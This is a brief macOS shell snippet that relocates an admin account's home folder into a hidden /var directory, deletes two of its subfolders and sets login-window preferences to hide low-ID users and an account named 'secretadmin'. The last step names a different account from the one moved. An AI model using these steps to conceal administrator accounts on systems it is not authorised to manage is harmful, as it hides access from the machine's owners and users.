mv /Users/zattooadmin /var/.zattooadmin
chown -R zattooadmin /var/.zattooadmin
rm -R /var/.zattooadmin/Public
rm -R /var/.zattooadmin/Sites
defaults write /Library/Preferences/com.apple.loginwindow Hide500Users -bool TRUE
defaults write /Library/Preferences/com.apple.loginwindow HiddenUsersList -array secretadmin
